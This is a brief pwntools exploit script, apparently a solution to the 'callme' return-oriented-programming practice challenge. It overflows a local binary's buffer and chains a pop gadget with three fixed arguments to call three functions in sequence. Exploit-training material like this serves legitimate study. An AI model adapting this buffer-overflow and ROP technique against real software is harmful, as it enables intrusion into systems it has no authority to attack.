from pwn import *

elf = ELF('callme')
r = process("./callme")
pop = 0x000000000040093c
arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d
callme_one = elf.symbols['callme_one']
callme_two = elf.symbols['callme_two']
callme_three = elf.symbols['callme_three']

payload = b'a'*40
payload += p64(pop)
payload += p64(arg1) + p64(arg2) + p64(arg3)
payload += p64(callme_one)
payload += p64(pop)
payload += p64(arg1) + p64(arg2) + p64(arg3)
payload += p64(callme_two)
payload += p64(pop)
payload += p64(arg1) + p64(arg2) + p64(arg3)
payload += p64(callme_three)

input()
r.sendafter('> ', payload)

r.interactive()